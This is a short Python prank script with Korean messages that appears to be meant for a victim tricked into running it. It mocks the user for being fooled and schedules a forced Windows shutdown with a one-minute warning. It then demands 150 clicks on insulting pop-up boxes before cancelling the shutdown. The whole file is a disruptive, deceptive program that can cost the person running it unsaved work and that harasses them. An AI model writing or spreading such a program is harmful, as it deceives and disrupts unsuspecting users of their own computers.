import os
import pyautogui

pyautogui.alert("혹시 방금 속았단 생각 안드니","월척이다!")
os.system("shutdown -s -c \"제한시간은 1분이다. 어서 서둘러\"")
i = 0
while(i< 150):
    count = int(150 - i)
    pyautogui.alert("제한시간은 1분이다. 남은 "+str(count)+"번 만큼 눌러 늦으면 컴퓨터는 꺼진다","멍청하네")
    i = int(i)+1
    if(i == 150):
        os.system("shutdown -a")
        pyautogui.alert("그래. 취소해줄게 다음엔 속지마렴","쯧쯧")
        pyautogui.alert("그래. 취소해줄게 다음엔 속지마렴","쯧쯧")
        break
